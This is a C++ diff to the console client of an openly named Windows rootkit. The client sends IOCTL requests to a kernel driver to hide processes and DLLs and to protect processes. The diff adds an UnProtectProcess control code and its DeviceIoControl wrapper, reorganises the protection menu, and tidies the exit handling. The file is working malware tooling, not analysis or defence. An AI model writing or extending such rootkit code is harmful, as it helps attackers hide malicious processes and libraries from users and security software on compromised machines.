@@ -14,6 +14,8 @@ namespace Rootkit {
             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x699, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
         constexpr ULONG HideDLL =
             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x700, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
+        constexpr ULONG UnProtectProcess =
+            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x701, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
     }
     struct Request {
         HANDLE process_id;
@@ -35,6 +37,22 @@ namespace Rootkit {
             nullptr                      // Overlapped
         );
 
+    }
+
+    bool UnProtectProcess(HANDLE driver_handle, DWORD pid) {
+        Request r;
+        r.process_id = ULongToHandle(pid);
+        // protecc
+        return DeviceIoControl(
+            driver_handle,
+            codes::UnProtectProcess,
+            &r,
+            sizeof(r),
+            &r,
+            sizeof(r),
+            nullptr,
+            nullptr
+        );
     }
 
     bool HideDLL(HANDLE driver_handle, DWORD pid, WCHAR* DLLName) {
@@ -156,6 +174,7 @@ int main() {
     int pidHide;
     int pidProtect;
     int pidDLLHide;
+    int choiceProtect;
     WCHAR DLLName[256];
     std::wstring tempDLLName;
 
@@ -184,10 +203,31 @@ int main() {
             break;
         }
         case 4: {
-            std::cout << "Enter a PID: ";
-            std::cin >> pidProtect;
-            std::cout << "[!] Sending Message to Driver.\n";
-            Rootkit::ProtectProcess(driver_handle, pidProtect);
+            system("cls");
+            std::cout << "===== Process Protection Menu =====\n";
+            std::cout << "1. Protect a Process.\n";
+            std::cout << "2. UnProtect a Process.\n";
+            std::cout << "=======================\n";
+            std::cout << "Enter a choice: ";
+            std::cin >> choiceProtect;
+            switch (choiceProtect) {
+            case 1:
+                std::cout << "Enter a PID: ";
+                std::cin >> pidProtect;
+                std::cout << "[!] Sending Message to Driver.\n";
+                Rootkit::ProtectProcess(driver_handle, pidProtect);
+                break;
+            case 2:
+                std::cout << "Enter a PID: ";
+                std::cin >> pidProtect;
+                std::cout << "[!] Sending Message to Driver.\n";
+                Rootkit::UnProtectProcess(driver_handle, pidProtect);
+                break;
+            default:
+                std::cout << "Invalid Choice. Exiting Program...\n";
+                CloseHandle(driver_handle);
+                return 1;
+            }
             break;
         }
         case 5: {
@@ -203,14 +243,17 @@ int main() {
         }
         case 99: {
             std::cout << "Exiting the program, bye!\n";
-            break;
+            CloseHandle(driver_handle);
+            return 0;
         }
         default: {
             std::cout << "Invalid Choice.\n";
+            Sleep(2000);
+            system("cls");
+            break;
         }
         }
-        CloseHandle(driver_handle);
-        std::cout << "Ended\n";
-        return 0;
+        Sleep(2000);
+        system("cls");
     }
 }
